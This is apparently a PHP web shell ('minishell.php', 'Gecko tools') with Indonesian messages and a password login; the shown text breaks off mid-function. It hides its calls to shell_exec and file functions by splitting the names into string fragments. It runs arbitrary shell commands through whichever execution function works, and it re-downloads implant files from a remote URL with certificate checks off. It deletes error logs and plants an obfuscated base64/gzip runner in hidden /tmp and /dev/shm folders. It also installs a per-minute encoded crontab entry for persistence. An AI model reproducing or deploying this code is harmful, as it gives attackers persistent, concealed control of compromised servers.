<?php
session_start();
error_reporting(0);

$_HASH = '$2y$10$FoD614kAZ1rlLtCMsPWOg.wfPSYEMiOGLbIghnXzNax5GDHs/6/J2';

if (isset($_POST['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (isset($_POST['password'])) {
    if (password_verify($_POST['password'], $_HASH)) {
        $_SESSION['auth'] = true;
    } else {
        $login_err = true;
    }
}

if (empty($_SESSION['auth'])) {
    ?><!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        html, body { width:100%; height:100%; background:#fff; }
        .wrap { display:flex; justify-content:center; align-items:center; height:100vh; }
        form { display:flex; flex-direction:column; align-items:center; gap:12px; }
        input[type="password"] {
            width:220px; padding:10px 14px; border:1px solid #ddd;
            border-radius:4px; font-size:14px; outline:none; color:#333;
        }
        input[type="password"]:focus { border-color:#aaa; }
        button {
            width:220px; padding:10px; background:#fff; color:#555;
            border:1px solid #ddd; border-radius:4px; font-size:14px; cursor:pointer;
        }
        button:hover { background:#f5f5f5; }
        .err { font-size:12px; color:#c00; }
    </style>
</head>
<body>
<div class="wrap">
    <form method="post">
        <input type="password" name="password" placeholder="Password" autofocus>
        <?php if(!empty($login_err)) echo '<span class="err">Password salah</span>'; ?>
        <button type="submit">Login</button>
    </form>
</div>
</body>
</html><?php
    exit;
}

$s_e = 'sh'.'ell'.'_ex'.'ec';
$f_p_c = 'fi'.'le_p'.'ut_con'.'tents';
$f_g_c = 'fi'.'le_g'.'et_con'.'tents';
$u_f = 'mo'.'ve_up'.'loaded_fi'.'le';

$dir = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
$dir = str_replace('\\', '/', $dir);
chdir($dir);

$GLOBALS['baseDir'] = $dir;
$GLOBALS['cwd'] = $dir;
$tab = isset($_GET['tab']) ? preg_replace('/[^a-z]/', '', strtolower((string)$_GET['tab'])) : 'files';
if (!in_array($tab, array('files', 'recover', 'preload', 'mass'), true)) {
    $tab = 'files';
}


// ===== Gecko tools (Recover / Preload / MassCopy) =====
function geckoEscapeshellarg($arg)
{
    $arg = (string)$arg;
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        
        $arg = str_replace('"', '', $arg);
        return '"' . $arg . '"';
    }
    
    return "'" . str_replace("'", "'\\''", $arg) . "'";
}


function geckoRunBashScriptFile($scriptBody, $cwd = null, $timeoutSec = 120)
{
    $cwd = $cwd ? $cwd : (isset($GLOBALS['baseDir']) ? $GLOBALS['baseDir'] : sys_get_temp_dir());
    $timeoutSec = max(1, (int)$timeoutSec);
    $tmpDir = function_exists('sys_get_temp_dir') ? sys_get_temp_dir() : '/tmp';
    $tmp = rtrim(str_replace('\\', '/', $tmpDir), '/') . '/.gecko_sh_' . str_replace('.', '', uniqid('', true)) . '.sh';

    $body = "#!/bin/bash\nset +e\n";
    $body .= "cd " . geckoEscapeshellarg($cwd) . " 2>/dev/null || true\n";
    $body .= (string)$scriptBody . "\n";

    if (@file_put_contents($tmp, $body) === false) {
        
        $tmp = rtrim(str_replace('\\', '/', $cwd), '/') . '/.gecko_sh_' . str_replace('.', '', uniqid('', true)) . '.sh';
        if (@file_put_contents($tmp, $body) === false) {
            return array(
                'output' => 'Cannot write temp shell script for execution.',
                'exit_code' => 1,
                'no_shell' => true,
                'method' => '',
            );
        }
    }
    @chmod($tmp, 0700);

    
    
    $cmd = 'bash ' . geckoEscapeshellarg($tmp);
    $cmdArgv = array('bash', $tmp);
    $result = null;

    
    if (function_exists('proc_open')) {
        $descriptors = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
        $pipes = array();
        $proc = false;
        
        if (defined('PHP_VERSION_ID') && PHP_VERSION_ID >= 70400) {
            $proc = @proc_open($cmdArgv, $descriptors, $pipes, $cwd);
            if (!is_resource($proc)) {
                $pipes = array();
                $proc = @proc_open(array('/bin/bash', $tmp), $descriptors, $pipes, $cwd);
            }
        }
        if (!is_resource($proc)) {
            $pipes = array();
            $proc = @proc_open($cmd, $descriptors, $pipes, $cwd);
        }
        if (!is_resource($proc)) {
            $pipes = array();
            $proc = @proc_open('/bin/bash ' . geckoEscapeshellarg($tmp), $descriptors, $pipes, $cwd);
        }
        if (is_resource($proc)) {
            fclose($pipes[0]);
            stream_set_blocking($pipes[1], false);
            stream_set_blocking($pipes[2], false);
            $stdout = '';
            $stderr = '';
            $deadline = microtime(true) + $timeoutSec;
            while (true) {
                $status = proc_get_status($proc);
                $read = array();
                if (isset($pipes[1]) && is_resource($pipes[1])) $read[] = $pipes[1];
                if (isset($pipes[2]) && is_resource($pipes[2])) $read[] = $pipes[2];
                if (!empty($read)) {
                    $write = null;
                    $except = null;
                    $tv = max(0, min(0.25, $deadline - microtime(true)));
                    if (@stream_select($read, $write, $except, (int)$tv, (int)(($tv - (int)$tv) * 1000000)) > 0) {
                        foreach ($read as $r) {
                            $chunk = fread($r, 8192);
                            if ($chunk === false || $chunk === '') continue;
                            if ($r === $pipes[1]) $stdout .= $chunk;
                            else $stderr .= $chunk;
                        }
                    }
                }
                if (!$status['running']) break;
                if (microtime(true) >= $deadline) {
                    @proc_terminate($proc, 9);
                    break;
                }
                usleep(50000);
            }
            if (isset($pipes[1]) && is_resource($pipes[1])) {
                $rest = stream_get_contents($pipes[1]);
                if ($rest) $stdout .= $rest;
                fclose($pipes[1]);
            }
            if (isset($pipes[2]) && is_resource($pipes[2])) {
                $rest = stream_get_contents($pipes[2]);
                if ($rest) $stderr .= $rest;
                fclose($pipes[2]);
            }
            $code = @proc_close($proc);
            $sep = ($stdout !== '' && $stderr !== '') ? "\n" : '';
            $out = trim($stdout . $sep . $stderr);
            $result = array(
                'output' => ($out !== '' ? $out : (($code === 0) ? '(no output)' : '')),
                'exit_code' => (int)$code,
                'method' => 'proc_open+script',
            );
        }
    }

    
    if ($result === null) {
        $result = runTerminalFallbackShell($cmd, $cwd, $timeoutSec);
        if (!empty($result['method'])) {
            $result['method'] = $result['method'] . '+script';
        }
    }

    @unlink($tmp);
    return $result;
}


function getCrontab()
{
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        $result = geckoShellRun('schtasks /query /fo LIST', $GLOBALS['baseDir'], 10);
        return array('content' => $result['output'], 'platform' => 'windows', 'editable' => false);
    }
    $result = geckoShellRun('crontab -l 2>&1', $GLOBALS['baseDir'], 15);
    $out = isset($result['output']) ? $result['output'] : '';
    if (!empty($result['timed_out'])) {
        return array('content' => '', 'platform' => 'unix', 'editable' => true, 'error' => 'crontab -l timed out');
    }
    if (!empty($result['no_shell'])) {
        return array('content' => '', 'platform' => 'unix', 'editable' => true, 'error' => $out);
    }
    if (stripos($out, 'no crontab') !== false) {
        $out = '';
    }
    return array('content' => $out, 'platform' => 'unix', 'editable' => true);
}


function setCrontab($content)
{
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        return array('ok' => false, 'error' => 'Edit crontab on Windows via schtasks in Terminal.');
    }
    
    $rawLines = preg_split("/\r\n|\n|\r/", (string)$content);
    if (!is_array($rawLines)) {
        $rawLines = array((string)$content);
    }
    $clean = array();
    foreach ($rawLines as $line) {
        $trim = trim($line);
        if ($trim === '') {
            continue;
        }
        if (stripos($trim, 'no crontab') !== false) {
            continue;
        }
        if (stripos($trim, 'command too long') !== false) {
            continue;
        }
        
        if (strlen($line) > 800) {
            continue;
        }
        $clean[] = $line;
    }
    $content = implode("\n", $clean) . "\n";

    $tmp = tempnam(sys_get_temp_dir(), 'cron');
    if ($tmp === false) {
        return array('ok' => false, 'error' => 'Cannot create temp file');
    }
    file_put_contents($tmp, $content);
    $result = geckoShellRun('crontab ' . geckoEscapeshellarg($tmp), $GLOBALS['baseDir'], 25);
    @unlink($tmp);
    if (!empty($result['timed_out'])) {
        return array('ok' => false, 'error' => 'crontab save timed out');
    }
    if (!empty($result['no_shell'])) {
        return array('ok' => false, 'error' => $result['output']);
    }
    if ((int)$result['exit_code'] !== 0) {
        return array('ok' => false, 'error' => $result['output'] ? $result['output'] : 'Failed to save crontab');
    }
    return array('ok' => true);
}


function geckoRecoverValidateDir($path)
{
    $path = trim(str_replace('\\', '/', (string)$path));
    if ($path === '' || $path === '/') {
        return array(false, 'DIR_PATH tidak valid.');
    }
    if (strpos($path, "\0") !== false) {
        return array(false, 'DIR_PATH mengandung karakter ilegal.');
    }
    if (preg_match('#(^|/)\.\.(/|$)#', $path)) {
        return array(false, 'DIR_PATH tidak boleh mengandung ..');
    }
    
    $isWinAbs = (bool)preg_match('/^[A-Za-z]:\//', $path);
    $isUnixAbs = (strlen($path) > 0 && $path[0] === '/');
    if (!$isWinAbs && !$isUnixAbs) {
        return array(false, 'DIR_PATH harus absolute path (contoh /var/www/... atau C:/...).');
    }
    return array(true, rtrim($path, '/'));
}


function geckoRecoverValidateFile($name)
{
    $name = trim((string)$name);
    if ($name === '' || $name === '.' || $name === '..') {
        return array(false, 'FILE_NAME tidak valid.');
    }
    if (strpos($name, '/') !== false || strpos($name, '\\') !== false || strpos($name, "\0") !== false) {
        return array(false, 'FILE_NAME tidak boleh berisi path separator.');
    }
    if (!preg_match('/^[A-Za-z0-9._-]+$/', $name)) {
        return array(false, 'FILE_NAME hanya boleh huruf, angka, titik, underscore, dash.');
    }
    return array(true, $name);
}


function geckoRecoverValidateUrl($url)
{
    $url = trim((string)$url);
    if ($url === '') {
        return array(false, 'DOWNLOAD_URL wajib diisi.');
    }
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return array(false, 'DOWNLOAD_URL tidak valid.');
    }
    $scheme = strtolower((string)parse_url($url, PHP_URL_SCHEME));
    if ($scheme !== 'http' && $scheme !== 'https') {
        return array(false, 'DOWNLOAD_URL harus http/https.');
    }
    return array(true, $url);
}


function geckoRecoverDownload($url)
{
    $tmp = tempnam(sys_get_temp_dir(), 'grec_');
    if ($tmp === false) {
        return array(false, null, 'Gagal membuat temp file.');
    }

    if (function_exists('curl_init')) {
        $fp = fopen($tmp, 'wb');
        if (!$fp) {
            @unlink($tmp);
            return array(false, null, 'Gagal membuka temp file.');
        }
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);
        curl_setopt($ch, CURLOPT_TIMEOUT, 25);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, 'GeckoRecover/1.0');
        curl_setopt($ch, CURLOPT_FAILONERROR, true);
        $ok = curl_exec($ch);
        $err = curl_error($ch);
        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        fclose($fp);
        if (!$ok || $code >= 400 || !is_file($tmp) || filesize($tmp) === 0) {
            @unlink($tmp);
            return array(false, null, 'Download gagal' . ($err ? (': ' . $err) : (' (HTTP ' . $code . ')')));
        }
        return array(true, $tmp, null);
    }

    $ctx = stream_context_create(array(
        'http' => array(
            'timeout' => 30,
            'follow_location' => 1,
            'user_agent' => 'GeckoRecover/1.0',
        ),
        'ssl' => array(
            'verify_peer' => false,
            'verify_peer_name' => false,
        ),
    ));
    $data = @file_get_contents($url, false, $ctx);
    if ($data === false || $data === '') {
        @unlink($tmp);
        return array(false, null, 'Download gagal (file_get_contents).');
    }
    if (file_put_contents($tmp, $data) === false || filesize($tmp) === 0) {
        @unlink($tmp);
        return array(false, null, 'Gagal menulis temp download.');
    }
    return array(true, $tmp, null);
}


function geckoRecoverMove($tmp, $dest)
{
    @chmod($tmp, 0444);
    if (@rename($tmp, $dest)) {
        return true;
    }
    $copied = @copy($tmp, $dest);
    @unlink($tmp);
    return (bool)$copied;
}


function geckoRecoverTarget($dirPath, $fileName, $downloadUrl, $skipVerify = true)
{
    $filePath = $dirPath . '/' . $fileName;
    $instanceId = substr(md5($dirPath . '|' . $fileName . '|' . $downloadUrl), 0, 8);
    $lockPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . '.gecko_rec_' . $instanceId . '.lock';
    $steps = array();

    $fp = @fopen($lockPath, 'c+');
    if (!$fp) {
        return array('ok' => false, 'error' => 'Gagal membuka lock file.', 'steps' => $steps);
    }

    $deadline = microtime(true) + 5;
    $locked = false;
    while (microtime(true) < $deadline) {
        if (flock($fp, LOCK_EX | LOCK_NB)) {
            $locked = true;
            break;
        }
        usleep(100000);
    }
    if (!$locked) {
        fclose($fp);
        return array('ok' => false, 'error' => 'Recover sedang berjalan (lock). Coba lagi.', 'steps' => $steps);
    }

    try {
        
        if (!is_dir($dirPath)) {
            if (!@mkdir($dirPath, 0755, true) && !is_dir($dirPath)) {
                flock($fp, LOCK_UN);
                fclose($fp);
                return array('ok' => false, 'error' => 'Gagal membuat direktori: ' . $dirPath, 'steps' => $steps);
            }
            $steps[] = 'Direktori dibuat: ' . $dirPath;
        } else {
            $steps[] = 'Direktori sudah ada: ' . $dirPath;
        }

        $dirPerms = substr(sprintf('%o', fileperms($dirPath)), -3);
        if ($dirPerms !== '755') {
            @chmod($dirPath, 0755);
            $steps[] = 'Permission dir diperbaiki: ' . $dirPerms . ' → 755';
        } else {
            $steps[] = 'Permission dir OK: 755';
        }

        
        foreach (array('error_log', 'error.log') as $logName) {
            $logPath = $dirPath . '/' . $logName;
            if (file_exists($logPath)) {
                @unlink($logPath);
                $steps[] = 'Dihapus: ' . $logName;
            }
        }

        $needsRecovery = !is_file($filePath) || filesize($filePath) === 0;
        if ($needsRecovery) {
            if (is_file($filePath)) {
                @unlink($filePath);
                $steps[] = 'File kosong dihapus, download ulang.';
            } else {
                $steps[] = 'File hilang, download dari URL.';
            }
            $dl = geckoRecoverDownload($downloadUrl);
            if (!$dl[0]) {
                flock($fp, LOCK_UN);
                fclose($fp);
                return array('ok' => false, 'error' => $dl[2], 'steps' => $steps);
            }
            if (!geckoRecoverMove($dl[1], $filePath)) {
                flock($fp, LOCK_UN);
                fclose($fp);
                return array('ok' => false, 'error' => 'Gagal memindahkan file ke target.', 'steps' => $steps);
            }
            $steps[] = 'File di-download & ditulis: ' . $filePath;
        } elseif ($skipVerify) {
            
            $steps[] = 'File sudah ada — skip verify download (cepat). Daemon akan verify.';
        } else {
            
            $dl = geckoRecoverDownload($downloadUrl);
            if (!$dl[0]) {
                flock($fp, LOCK_UN);
                fclose($fp);
                return array('ok' => false, 'error' => 'Verify gagal: ' . $dl[2], 'steps' => $steps);
            }
            $same = (md5_file($dl[1]) === md5_file($filePath));
            if (!$same) {
                if (!geckoRecoverMove($dl[1], $filePath)) {
                    flock($fp, LOCK_UN);
                    fclose($fp);
                    return array('ok' => false, 'error' => 'Gagal restore file (isi berbeda).', 'steps' => $steps);
                }
                $steps[] = 'Isi file berbeda — di-restore dari URL.';
            } else {
                @unlink($dl[1]);
                $steps[] = 'Isi file sama dengan remote — tidak diubah.';
            }
        }

        if (is_file($filePath) && filesize($filePath) === 0) {
            @unlink($filePath);
            flock($fp, LOCK_UN);
            fclose($fp);
            return array('ok' => false, 'error' => 'Hasil recover kosong (0 byte), file dihapus.', 'steps' => $steps);
        }

        if (is_file($filePath)) {
            $filePerms = substr(sprintf('%o', fileperms($filePath)), -3);
            if ($filePerms !== '444') {
                @chmod($filePath, 0444);
                $steps[] = 'Permission file diperbaiki: ' . $filePerms . ' → 444';
            } else {
                $steps[] = 'Permission file OK: 444';
            }
        }

        $size = is_file($filePath) ? filesize($filePath) : 0;
        $steps[] = 'Recover selesai. Size: ' . $size . ' bytes.';
        flock($fp, LOCK_UN);
        fclose($fp);
        return array(
            'ok' => true,
            'message' => 'Recover berhasil: ' . $filePath,
            'path' => $filePath,
            'size' => $size,
            'steps' => $steps,
        );
    } catch (Exception $e) {
        flock($fp, LOCK_UN);
        fclose($fp);
        return array('ok' => false, 'error' => $e->getMessage(), 'steps' => $steps);
    }
}


function geckoBashQuote($s)
{
    return "'" . str_replace("'", "'\\''", (string)$s) . "'";
}


function geckoWriteObfuscatedRunner($dest, $plainScript, $instanceId)
{
    $dir = dirname($dest);
    if (!is_dir($dir) && !@mkdir($dir, 0700, true) && !is_dir($dir)) {
        return false;
    }

    $useGzip = false;
    $b64 = '';
    if (function_exists('gzencode')) {
        $gz = @gzencode($plainScript, 9);
        if ($gz !== false && $gz !== '') {
            $b64 = base64_encode($gz);
            $useGzip = true;
        }
    }
    if ($b64 === '') {
        $b64 = base64_encode($plainScript);
        $useGzip = false;
    }
    if ($b64 === '') {
        return false;
    }

    $mid = (int)floor(strlen($b64) / 2);
    $v1 = '_0x' . substr($instanceId, 0, 4);
    $v2 = '_0x' . substr($instanceId, 4, 4);
    if ($v2 === '_0x') {
        $v2 = '_0x' . substr(md5($instanceId), 0, 4);
    }
    $j1 = '_j' . substr(md5($instanceId), 0, 8);
    $j2 = '_j' . substr(md5($instanceId), 8, 8);
    $junk1 = dechex(mt_rand(0x10000000, 0x7fffffff));
    $junk2 = dechex(mt_rand(0x10000000, 0x7fffffff));
    $part1 = substr($b64, 0, $mid);
    $part2 = substr($b64, $mid);
    $pipe = $useGzip
        ? 'echo "${' . $v1 . '}${' . $v2 . '}"|base64 -d|gzip -dc|bash -s -- "$@"'
        : 'echo "${' . $v1 . '}${' . $v2 . '}"|base64 -d|bash -s -- "$@"';

    $stub = "#!/bin/bash\n"
        . $j1 . '=' . $junk1 . "\n"
        . $j2 . '=' . $junk2 . "\n"
        . $v1 . "='" . $part1 . "'\n"
        . $v2 . "='" . $part2 . "'\n"
        . $pipe . "\n";

    if (@file_put_contents($dest, $stub) === false) {
        return false;
    }
    @chmod($dest, 0700);
    return true;
}


function geckoShellRun($command, $cwd = null, $timeoutSec = 60)
{
    if ($cwd === null || $cwd === '') {
        $cwd = function_exists('sys_get_temp_dir') ? sys_get_temp_dir() : '/tmp';
    }
    $timeoutSec = max(1, (int)$timeoutSec);
    $full = 'cd ' . geckoEscapeshellarg($cwd) . ' && ' . $command;

    $methods = array('proc_open', 'shell_exec', 'popen', 'system', 'passthru', 'exec');
    $tried = array();
    $last = array(
        'output' => 'No shell runner available (proc_open/shell_exec/popen/system/passthru/exec all disabled).',
        'exit_code' => 1,
        'no_shell' => true,
        'method' => '',
        'tried' => array(),
    );

    foreach ($methods as $method) {
        $res = geckoShellRunWithMethod($method, $command, $full, $cwd, $timeoutSec);
        if ($res === null) {
            continue; 
        }
        $tried[] = $method . '(exit=' . (int)$res['exit_code'] . ')';
        $res['method'] = $method;
        $res['tried'] = $tried;
        $last = $res;
        
        if ((int)$res['exit_code'] === 0) {
            return $res;
        }
        
    }

    $last['tried'] = $tried;
    if (empty($tried)) {
        $last['no_shell'] = true;
    }
    return $last;
}


function geckoShellRunFallbackSPE($command, $cwd = null, $timeoutSec = 60)
{
    if ($cwd === null || $cwd === '') {
        $cwd = function_exists('sys_get_temp_dir') ? sys_get_temp_dir() : '/tmp';
    }
    $timeoutSec = max(1, (int)$timeoutSec);
    $full = 'cd ' . geckoEscapeshellarg($cwd) . ' && ' . $command;

    $methods = array('system', 'passthru', 'exec');
    $tried = array();
    $last = array(
        'output' => 'system()/passthru()/exec() all unavailable or failed.',
        'exit_code' => 1,
        'no_shell' => true,
        'method' => '',
        'tried' => array(),
    );

    foreach ($methods as $method) {
        $res = geckoShellRunWithMethod($method, $command, $full, $cwd, $timeoutSec);
        if ($res === null) {
            $tried[] = $method . '(disabled)';
            continue;
        }
        $tried[] = $method . '(exit=' . (int)$res['exit_code'] . ')';
        $res['method'] = $method;
        $res['tried'] = $tried;
        $last = $res;
        if ((int)$res['exit_code'] === 0) {
            return $res;
        }
    }

    $last['tried'] = $tried;
    return $last;
}


function geckoShellRunWithMethod($method, $command, $full, $cwd, $timeoutSec)
{
    try {
        if ($method === 'proc_open') {
            if (!function_exists('proc_open')) {
                return null;
            }
            
            $r = runTerminal($command, $cwd, $timeoutSec, false);
            if (!is_array($r)) {
                return array('output' => 'proc_open invalid result', 'exit_code' => 1);
            }
            
            if (!empty($r['no_shell']) || (isset($r['output']) && $r['output'] === 'Failed to execute.')) {
                return array(
                    'output' => isset($r['output']) ? $r['output'] : 'proc_open failed',
                    'exit_code' => 1,
                );
            }
            return array(
                'output' => isset($r['output']) ? $r['output'] : '',
                'exit_code' => isset($r['exit_code']) ? (int)$r['exit_code'] : 1,
                'timed_out' => !empty($r['timed_out']),
            );
        }

        if ($method === 'shell_exec') {
            if (!function_exists('shell_exec')) {
                return null;
            }
            $out = @shell_exec($full . ' 2>&1');
            return array(
                'output' => is_string($out) ? $out : '',
                'exit_code' => 0, 
            );
        }

        if ($method === 'popen') {
            if (!function_exists('popen')) {
                return null;
            }
            $h = @popen($full . ' 2>&1', 'r');
            if (!is_resource($h)) {
                return array('output' => 'popen() failed', 'exit_code' => 1);
            }
            $out = '';
            $deadline = microtime(true) + $timeoutSec;
            while (!feof($h) && microtime(true) < $deadline) {
                $chunk = fread($h, 8192);
                if ($chunk === false || $chunk === '') {
                    usleep(50000);
                    continue;
                }
                $out .= $chunk;
            }
            $code = pclose($h);
            return array('output' => trim($out), 'exit_code' => (int)$code);
        }

        if ($method === 'system') {
            if (!function_exists('system')) {
                return null;
            }
            ob_start();
            $code = 1;
            @system($full . ' 2>&1', $code);
            $out = ob_get_clean();
            return array(
                'output' => is_string($out) ? $out : '',
                'exit_code' => (int)$code,
            );
        }

        if ($method === 'passthru') {
            if (!function_exists('passthru')) {
                return null;
            }
            ob_start();
            $code = 1;
            @passthru($full . ' 2>&1', $code);
            $out = ob_get_clean();
            return array(
                'output' => is_string($out) ? $out : '',
                'exit_code' => (int)$code,
            );
        }

        if ($method === 'exec') {
            if (!function_exists('exec')) {
                return null;
            }
            $lines = array();
            $code = 1;
            @exec($full . ' 2>&1', $lines, $code);
            return array(
                'output' => implode("\n", $lines),
                'exit_code' => (int)$code,
            );
        }
    } catch (Exception $ex) {
        return array('output' => $method . ' exception: ' . $ex->getMessage(), 'exit_code' => 1);
    } catch (Throwable $ex) {
        return array('output' => $method . ' error: ' . $ex->getMessage(), 'exit_code' => 1);
    }

    return null;
}


function geckoPatchCronShAssign($script, $key, $value)
{
    $q = geckoBashQuote($value);
    $lines = preg_split("/\r\n|\n|\r/", (string)$script);
    if (!is_array($lines)) {
        $lines = array((string)$script);
    }
    $found = false;
    $prefix = $key . '=';
    foreach ($lines as $i => $line) {
        $trim = ltrim($line);
        if (strpos($trim, $prefix) === 0) {
            $lines[$i] = $key . '=' . $q;
            $found = true;
            break;
        }
    }
    if (!$found) {
        $insertAt = 0;
        foreach ($lines as $i => $line) {
            if (strpos($line, '#!/') === 0) {
                $insertAt = $i + 1;
                break;
            }
        }
        array_splice($lines, $insertAt, 0, array($key . '=' . $q));
    }
    return implode("\n", $lines);
}


function geckoRecoverEnsureShortCrontab($installPath, $shmPath, $cronMarker, &$steps)
{
    $installPath = str_replace('\\', '/', (string)$installPath);
    $shmPath = str_replace('\\', '/', (string)$shmPath);
    $cronMarker = trim((string)$cronMarker);
    if ($cronMarker === '') {
        $steps[] = 'Short crontab: marker kosong — skip';
        return false;
    }

    $exec = '';
    if ($installPath !== '' && @is_file($installPath)) {
        $exec = $installPath;
    } elseif ($shmPath !== '' && @is_file($shmPath)) {
        $exec = $shmPath;
    }
    if ($exec === '') {
        $steps[] = 'Short crontab: runner belum ada di disk — skip';
        return false;
    }

    $sid = '';
    if (preg_match('/cronsh_([a-f0-9]+)/', $cronMarker, $m)) {
        $sid = $m[1];
    }

    $cur = getCrontab();
    $content = isset($cur['content']) ? (string)$cur['content'] : '';
    if (!empty($cur['error']) && $content === '') {
        $steps[] = 'Short crontab: crontab -l gagal: ' . $cur['error'];
        
    }

    $rawLines = preg_split("/\r\n|\n|\r/", $content);
    if (!is_array($rawLines)) $rawLines = array();
    $kept = array();
    $removed = 0;
    foreach ($rawLines as $line) {
        $trim = trim($line);
        if ($trim === '') {
            continue;
        }
        
        if (stripos($trim, 'no crontab') !== false) continue;
        if (stripos($trim, 'command too long') !== false) continue;

        if ($cronMarker !== '' && strpos($line, $cronMarker) !== false) {
            $removed++;
            continue;
        }
        if ($sid !== '' && strpos($line, 'cronsh_' . $sid) !== false) {
            $removed++;
            continue;
        }
        
        if (strlen($line) > 800) {
            $removed++;
            $steps[] = 'Short crontab: buang baris overlong (' . strlen($line) . ' chars)';
            continue;
        }
        $kept[] = $line;
    }

    $inner = '/bin/bash ' . geckoBashQuote($exec) . ' --recover';
    $b64 = base64_encode($inner);
    $cronLine = '*/1 * * * * echo \'' . $b64 . '\' | base64 -d 2>/dev/null | bash >/dev/null 2>&1 ' . $cronMarker;
    if (strlen($cronLine) > 800) {
        
        $cronLine = '*/1 * * * * /bin/bash ' . geckoBashQuote($exec) . ' --recover >/dev/null 2>&1 ' . $cronMarker;
        $steps[] = 'Short crontab: b64 line too long — fallback plain';
    }
    $kept[] = $cronLine;
    $newContent = implode("\n", $kept) . "\n";

    $steps[] = 'Short crontab install (b64 cmd): echo \'<b64>\' | base64 -d | bash · marker ' . $cronMarker;
    $steps[] = 'Short crontab line len: ' . strlen($cronLine) . ' chars';
    if ($removed > 0) {
        $steps[] = 'Short crontab: cleaned ' . $removed . ' old/overlong line(s)';
    }

    $save = setCrontab($newContent);
    if (empty($save['ok'])) {
        $err = isset($save['error']) ? $save['error'] : 'crontab save failed';
        $steps[] = 'Short crontab FAILED: ' . substr(preg_replace('/\s+/', ' ', $err), 0, 200);
        return false;
    }

    
    $verify = getCrontab();
    $vcontent = isset($verify['content']) ? (string)$verify['content'] : '';
    $ok = ($vcontent !== '' && strpos($vcontent, $cronMarker) !== false);
    $steps[] = 'Short crontab verify: ' . ($ok ? 'OK' : 'MISSING');
    return $ok;
}


function geckoCronShNormalizeLf($script)
{
    $script = str_replace("\r\n", "\n", (string)$script);
    return str_replace("\r", "\n", $script);
}


function geckoDownloadCronShTemplate($url)
{
    
    $script = geckoEmbeddedCronShTemplate();
    $script = geckoCronShNormalizeLf($script);
    if (is_string($script) && $script !== '' && strpos($script, 'DIR_PATH=') !== false && strpos($script, 'install_crontab') !== false) {
        return array(true, $script, 'Using embedded cron.sh (single-file, no upload cron.sh)');
    }
    return array(false, null, 'Embedded cron.sh template missing/corrupt in minishell.php');
}


function geckoRecoverDeployViaRemoteCronSh($dirPath, $fileName, $downloadUrl)
{
    $steps = array();
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        return array(
            'ok' => false,
            'error' => 'Persistence (cron.sh) hanya untuk Linux/Unix.',
            'steps' => array('Skip persistence di Windows.'),
        );
    }

    $cronTemplateUrl = 'embedded://manager.php/cron.sh';
    $instanceId = substr(md5($dirPath . '|' . $fileName . '|' . $downloadUrl), 0, 8);
    $installPath = '/tmp/.' . $instanceId . '/.runner.sh';
    $shmPath = '/dev/shm/.' . $instanceId . '/.runner.sh';
    $pidFile = '/tmp/.' . $instanceId . '.pid';
    $cronMarker = '# cronsh_' . $instanceId;
    $tmpCron = '/tmp/.gecko_cron_' . $instanceId . '.sh';

    $steps[] = 'Load cron.sh template: embedded in minishell.php (single-file)';
    $got = geckoDownloadCronShTemplate($cronTemplateUrl);
    if (!$got[0]) {
        return array(
            'ok' => false,
            'error' => 'Gagal download cron.sh: ' . $got[2],
            'steps' => $steps,
        );
    }
    if (!empty($got[2])) {
        $steps[] = $got[2];
    }
    $script = $got[1];
    $script = geckoCronShNormalizeLf($script);
    $steps[] = 'cron.sh template OK (' . strlen($script) . ' bytes)';

    $script = geckoPatchCronShAssign($script, 'DIR_PATH', $dirPath);
    $script = geckoPatchCronShAssign($script, 'FILE_NAME', $fileName);
    $script = geckoPatchCronShAssign($script, 'DOWNLOAD_URL', $downloadUrl);
    $steps[] = 'Patched DIR_PATH=' . $dirPath;
    $steps[] = 'Patched FILE_NAME=' . $fileName;
    $steps[] = 'Patched DOWNLOAD_URL=' . $downloadUrl;

    
    $beforePatch = $script;
    $script = geckoCronShPatchShortCrontab($script);
    
    $script = geckoCronShNormalizeLf($script);
    if ($script !== $beforePatch) {
        $steps[] = 'Patched install_crontab → short b64 cmd + LF normalize';
    } else {
        $steps[] = 'Short crontab patch: no install_crontab() found — PHP heal will run if needed';
    }

    if (@file_put_contents($tmpCron, $script) === false) {
        
        $tmpCron = '/dev/shm/.gecko_cron_' . $instanceId . '.sh';
        if (@file_put_contents($tmpCron, $script) === false) {
            return array(
                'ok' => false,
                'error' => 'Gagal menulis temp cron.sh ke /tmp atau /dev/shm',
                'steps' => $steps,
            );
        }
    }
    @chmod($tmpCron, 0700);
    $steps[] = 'Temp cron.sh written: ' . $tmpCron;

    $cmd = 'bash ' . geckoEscapeshellarg($tmpCron);
    $cwdCron = dirname($tmpCron);
    $run = geckoShellRun($cmd, $cwdCron, 90);
    $steps[] = 'bash cron.sh via ' . (isset($run['method']) && $run['method'] !== '' ? $run['method'] : '?')
        . ' exit=' . (isset($run['exit_code']) ? $run['exit_code'] : '?');
    if (!empty($run['tried'])) {
        $steps[] = 'shell tried: ' . implode(' → ', $run['tried']);
    }

    
    $needFallback = !empty($run['no_shell']) || (int)$run['exit_code'] !== 0;
    if ($needFallback) {
        $steps[] = 'Primary run failed — retry with system()/passthru()/exec()';
        $run2 = geckoShellRunFallbackSPE($cmd, $cwdCron, 90);
        $steps[] = 'fallback SPE via ' . (isset($run2['method']) && $run2['method'] !== '' ? $run2['method'] : '?')
            . ' exit=' . (isset($run2['exit_code']) ? $run2['exit_code'] : '?');
        if (!empty($run2['tried'])) {
